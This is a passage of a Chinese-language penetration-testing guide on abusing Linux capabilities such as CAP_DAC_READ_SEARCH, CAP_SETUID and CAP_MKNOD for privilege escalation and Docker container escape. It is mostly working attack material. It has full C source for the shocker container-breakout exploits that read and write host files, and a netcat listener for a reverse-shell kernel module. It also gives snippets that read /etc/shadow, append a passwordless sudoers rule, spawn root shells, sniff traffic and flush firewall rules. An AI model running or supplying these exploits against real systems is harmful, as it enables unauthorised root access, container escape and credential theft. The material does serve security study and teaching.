sudo apt full-upgrade
```
最后，在一个 shell 中启动 `nc` 并从另一个 shell 中**加载模块**，然后你将捕获到 `nc` 进程中的 shell：
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**这种技术的代码是从** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的"滥用SYS\_MODULE功能"实验室中复制的。**

另一个关于这种技术的例子可以在[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) **中找到。**

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) **使进程能够** **绕过读取文件和读取和执行目录的权限**。它的主要用途是用于文件搜索或读取目的。但是，它还允许进程使用`open_by_handle_at(2)`函数，该函数可以访问任何文件，包括进程挂载命名空间之外的文件。`open_by_handle_at(2)`中使用的句柄应该是通过`name_to_handle_at(2)`获得的不透明标识符，但它可能包含像inode号这样容易被篡改的敏感信息。对于这种功能的潜在利用可能性，特别是在Docker容器的背景下，Sebastian Krahmer通过shocker漏洞展示了其利用潜力，详细分析请参见[此处](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)。
**这意味着您可以** **绕过文件读取权限检查和目录读取/执行权限检查。**

**使用二进制文件的示例**

该二进制文件将能够读取任何文件。因此，如果像tar这样的文件具有此功能，则将能够读取shadow文件：
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**使用binary2进行示例**

在这种情况下，假设**`python`**二进制文件具有这种能力。为了列出根文件，您可以执行：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
而要读取一个文件，您可以执行：
```python
print(open("/etc/shadow", "r").read())
```
**环境中的示例（Docker越狱）**

您可以使用以下命令检查Docker容器中启用的功能：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
在先前的输出中，您可以看到**DAC\_READ\_SEARCH**功能已启用。因此，容器可以**调试进程**。

您可以在[https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)了解以下利用的工作原理，但简而言之，**CAP\_DAC\_READ\_SEARCH**不仅允许我们在没有权限检查的情况下遍历文件系统，还明确删除了对**open\_by\_handle\_at(2)**的任何检查，**可能允许我们的进程访问其他进程打开的敏感文件**。

滥用这些权限以从主机读取文件的原始利用程序可以在此处找到：[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)，以下是一个**修改后的版本，允许您指定要读取的文件作为第一个参数并将其转储到文件中。**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
漏洞需要找到指向主机上某个挂载的指针。原始漏洞使用文件 /.dockerinit，而这个修改后的版本使用 /etc/hostname。如果漏洞无法工作，也许你需要设置一个不同的文件。要找到在主机上挂载的文件，只需执行 mount 命令：
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**此技术的代码是从** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **的实验室"Abusing DAC\_READ\_SEARCH Capability"中复制的**

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **是西班牙最重要的网络安全活动之一，也是欧洲最重要的之一。** 以**促进技术知识**为使命，这个大会是技术和网络安全专业人士在各个领域的热点会议。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**这意味着您可以绕过对任何文件的写入权限检查，因此您可以写入任何文件。**

有很多文件可以**覆盖以提升权限**，[**您可以从这里获取一些想法**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**使用二进制文件的示例**

在这个示例中，vim 具有此功能，因此您可以修改任何文件，如 _passwd_、_sudoers_ 或 _shadow_:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**二进制文件2的示例**

在这个示例中，**`python`** 二进制文件将具有这个能力。您可以使用python来覆盖任何文件：
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**使用环境 + CAP_DAC_READ_SEARCH（Docker越狱）示例**

您可以使用以下命令检查Docker容器中启用的功能：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
首先阅读前面一节中关于滥用 DAC\_READ\_SEARCH 能力来读取主机任意文件的内容，并**编译**利用程序。\
然后，**编译以下版本的 shocker 利用程序**，它将允许您在主机文件系统中**写入任意文件**：
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
为了逃离docker容器，您可以从主机**下载**文件`/etc/shadow`和`/etc/passwd`，**添加**一个**新用户**，然后使用**`shocker_write`**来覆盖它们。然后，通过**ssh**进行**访问**。

**这种技术的代码是从** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **的"滥用DAC\_OVERRIDE权限"实验室中复制的。**

## CAP\_CHOWN

**这意味着可以更改任何文件的所有权。**

**使用二进制文件的示例**

假设**`python`**二进制文件具有此权限，您可以**更改** **shadow** 文件的**所有者**，**更改root密码**，并提升权限：
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
或者使用具有此能力的 **`ruby`** 二进制文件：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**这意味着可以更改任何文件的权限。**

**使用二进制文件的示例**

如果 Python 具有此功能，则可以修改 shadow 文件的权限，**更改 root 密码**，并提升权限：
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**这意味着可以设置所创建进程的有效用户ID。**

**使用二进制文件的示例**

如果Python拥有这个**能力**，您可以非常容易地滥用它来提升权限至root：
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**另一种方法：**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**这意味着可以设置所创建进程的有效组ID。**

有很多文件可以**覆盖以提升权限**，[**你可以从这里获取一些想法**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。

**使用二进制文件的示例**

在这种情况下，您应该寻找组可以读取的有趣文件，因为您可以冒充任何组：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
一旦找到可以滥用的文件（通过读取或写入）以提升权限，您可以使用以下命令**获取一个模拟感兴趣组的 shell**：
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
在这种情况下，组影子被冒充，因此您可以读取文件 `/etc/shadow`:
```bash
cat /etc/shadow
```
如果安装了**docker**，您可以**冒充** **docker组** 并滥用它与[docker套接字进行通信并提升权限](./#writable-docker-socket)。

## CAP\_SETFCAP

**这意味着可以在文件和进程上设置功能**

**使用二进制文件的示例**

如果Python具有这个**功能**，您可以很容易地滥用它以提升权限到root：

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
请注意，如果您使用CAP\_SETFCAP为二进制文件设置新的能力，您将失去此能力。
{% endhint %}

一旦您拥有[SETUID capability](linux-capabilities.md#cap\_setuid)，您可以转到其部分查看如何提升特权。

**使用环境示例（Docker越狱）**

默认情况下，在Docker容器内部的进程会被赋予**CAP\_SETFCAP能力**。您可以通过执行以下操作进行检查：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
这种能力允许**将任何其他能力赋予二进制文件**，因此我们可以考虑**利用本页中提到的任何其他能力突破**来从容器中**逃脱**。\
然而，如果你尝试为 gdb 二进制文件赋予例如 CAP\_SYS\_ADMIN 和 CAP\_SYS\_PTRACE 这样的能力，你会发现你可以赋予它们，但是**二进制文件在此之后将无法执行**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[来自文档](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: 这是线程可以假定的有效功能的**限制超集**。对于不具有其有效集中的CAP\_SETPCAP功能的线程，这也是可以添加到可继承集中的功能的限制超集。_\
看起来Permitted功能限制了可以使用的功能。\
然而，Docker默认也授予**CAP\_SETPCAP**，因此您可能能够**在可继承功能中设置新功能**。\
然而，在此功能的文档中：_CAP\_SETPCAP：\[...\] **从调用线程的边界集中添加任何功能到其可继承集中**。_\
看起来我们只能从边界集中添加功能到可继承集中。这意味着**我们无法将新功能（如CAP\_SYS\_ADMIN或CAP\_SYS\_PTRACE）放入继承集中以提升权限**。

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)提供了许多敏感操作，包括访问`/dev/mem`、`/dev/kmem`或`/proc/kcore`，修改`mmap_min_addr`，访问`ioperm(2)`和`iopl(2)`系统调用，以及各种磁盘命令。通过此功能还启用了`FIBMAP ioctl(2)`，这在[过去](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)曾引起问题。根据手册页面，这还允许持有者描述性地`在其他设备上执行一系列特定于设备的操作`。

这对于**特权升级**和**Docker越狱**可能很有用。

## CAP\_KILL

**这意味着可以杀死任何进程。**

**使用二进制文件的示例**

假设**`python`**二进制文件具有此功能。如果您还可以**修改某些服务或套接字配置**（或与服务相关的任何配置文件），您可以在其中设置后门，然后杀死与该服务相关的进程，并等待执行新配置文件以执行您的后门。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**使用 kill 特权提升**

如果你拥有 kill 权限，并且有一个以 root 用户（或其他用户）身份运行的 node 程序，你可能可以向其发送信号 SIGUSR1，使其打开 node 调试器，从而可以连接到该程序。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) 是西班牙最重要的网络安全活动之一，也是欧洲最重要的之一。以促进技术知识为使命，这个大会是技术和网络安全专业人士在各个领域的热点聚会。

{% embed url="https://www.rootedcon.com/" %}

## CAP_NET_BIND_SERVICE

**这意味着可以在任何端口上监听（甚至在特权端口上）。** 不能直接使用此功能升级权限。

**使用二进制文件的示例**

如果 **`python`** 具有此功能，则可以在任何端口上监听，甚至可以从其中连接到任何其他端口（某些服务需要从特定特权端口连接）。

{% tabs %}
{% tab title="监听" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="连接" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)功能允许进程**创建原始和数据包套接字**，使其能够生成和发送任意网络数据包。这可能会在容器化环境中带来安全风险，如数据包欺骗、流量注入和绕过网络访问控制。恶意行为者可以利用这一点干扰容器路由或者威胁主机网络安全，尤其是在没有足够防火墙保护的情况下。此外，**CAP_NET_RAW**对于特权容器来说是至关重要的，以支持通过原始 ICMP 请求进行 ping 等操作。

**这意味着可能会窃听流量。** 你不能直接利用这个功能升级权限。

**使用二进制文件的示例**

如果二进制文件**`tcpdump`**具有这个功能，你将能够使用它来捕获网络信息。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
请注意，如果**环境**提供了这种能力，您还可以使用**`tcpdump`**来嗅探流量。

**使用二进制文件2的示例**

以下示例是**`python2`**代码，可用于拦截“**lo**”（**本地主机**）接口的流量。 该代码来自[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)上的实验“_基础知识：CAP-NET\_BIND + NET\_RAW_”。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)功能赋予持有者**更改网络配置**的权限，包括防火墙设置、路由表、套接字权限以及在公开的网络命名空间中更改网络接口设置。它还可以启用网络接口的**混杂模式**，允许跨命名空间进行数据包嗅探。

**使用二进制示例**

假设**python二进制文件**具有这些功能。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**这意味着可以修改inode属性。** 你不能直接使用这个能力来提升权限。

**使用二进制文件的示例**

如果你发现一个文件是不可变的，并且python具有这个能力，你可以**移除不可变属性并使文件可修改：**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
请注意，通常会使用以下命令设置和移除这个不可变属性：
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 启用 `chroot(2)` 系统调用的执行，可能允许通过已知漏洞从 `chroot(2)` 环境中逃逸：

* [如何从各种 chroot 解决方案中逃逸](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot 逃逸工具](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 不仅允许执行 `reboot(2)` 系统调用以进行系统重启，包括针对特定硬件平台定制的诸如 `LINUX_REBOOT_CMD_RESTART2` 等特定命令，还允许使用 `kexec_load(2)` 和从 Linux 3.17 开始，`kexec_file_load(2)` 用于加载新的或签名的崩溃内核。

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 在 Linux 2.6.37 中从更广泛的 **CAP_SYS_ADMIN** 中分离出来，专门授予使用 `syslog(2)` 调用的能力。此功能使得在 `kptr_restrict` 设置为 1 时可以查看内核地址，通过 `/proc` 和类似接口。自 Linux 2.6.39 起，默认情况下 `kptr_restrict` 为 0，意味着内核地址被公开，尽管许多发行版出于安全原因将其设置为 1（除了 uid 0 外隐藏地址）或 2（始终隐藏地址）。

此外，**CAP_SYSLOG** 允许在 `dmesg_restrict` 设置为 1 时访问 `dmesg` 输出。尽管发生了这些变化，由于历史先例，**CAP_SYS_ADMIN** 仍保留执行 `syslog` 操作的能力。

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 扩展了 `mknod` 系统调用的功能，不仅可以创建常规文件、FIFO（命名管道）或 UNIX 域套接字，还允许创建特殊文件，包括：

- **S_IFCHR**：字符特殊文件，如终端等设备。
- **S_IFBLK**：块特殊文件，如磁盘等设备。

此功能对于需要能够创建设备文件的进程至关重要，通过字符或块设备实现直接硬件交互。

这是默认的 docker 能力 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))。

此功能允许在以下条件下在主机上进行特权升级（通过完整磁盘读取）：

1. 对主机有初始访问权限（非特权）。
2. 对容器有初始访问权限（特权（EUID 0），并具有有效的 `CAP_MKNOD`）。
3. 主机和容器应共享相同的用户命名空间。

**在容器中创建和访问块设备的步骤：**

1. **作为标准用户在主机上：**
- 使用 `id` 确定当前用户 ID，例如，`uid=1000(standarduser)`。
- 确定目标设备，例如 `/dev/sdb`。

2. **作为 `root` 在容器内部：**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **回到主机：**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
### CAP\_SETPCAP

**CAP_SETPCAP** 允许一个进程**修改另一个进程的能力集**，允许向有效、可继承和可许可的集合中添加或移除能力。然而，一个进程只能修改它自己许可集中拥有的能力，确保它不能提升另一个进程的权限超出自己的权限。最近的内核更新已经加强了这些规则，限制 `CAP_SETPCAP` 仅能减少其自身或其后代的许可集中的能力，旨在减轻安全风险。使用需要在有效集中拥有 `CAP_SETPCAP`，并且在许可集中拥有目标能力，利用 `capset()` 进行修改。这总结了 `CAP_SETPCAP` 的核心功能和限制，突出了它在特权管理和安全增强中的作用。

**`CAP_SETPCAP`** 是一个 Linux 能力，允许一个进程**修改另一个进程的能力集**。它授予向其他进程的有效、可继承和可许可能力集中添加或移除能力的能力。然而，对于如何使用这种能力有一些限制。

拥有 `CAP_SETPCAP` 的进程**只能授予或移除其自身许可能力集中的能力**。换句话说，如果一个进程自身没有某个能力，它就不能将该能力授予另一个进程。这种限制防止了一个进程将另一个进程的权限提升到超出其自身权限级别的程度。

此外，在最近的内核版本中，`CAP_SETPCAP` 能力已经**进一步受到限制**。它不再允许一个进程任意修改其他进程的能力集。相反，它**只允许一个进程降低其自身许可能力集或其后代的许可能力集中的能力**。这一变化旨在减少与该能力相关的潜在安全风险。

